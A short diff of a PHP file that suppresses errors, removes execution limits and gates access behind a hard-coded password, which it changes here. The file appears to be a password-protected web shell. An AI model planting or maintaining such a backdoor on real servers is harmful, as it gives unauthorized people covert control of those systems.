@@ -13,7 +13,7 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$MyPass = 'Rahasia13'; // Password Default: RegiGans
+$MyPass = 'Nergondes13'; // Password Default: RegiGans
 if (empty($_SESSION['login'])) {
     pausi_login();
 }
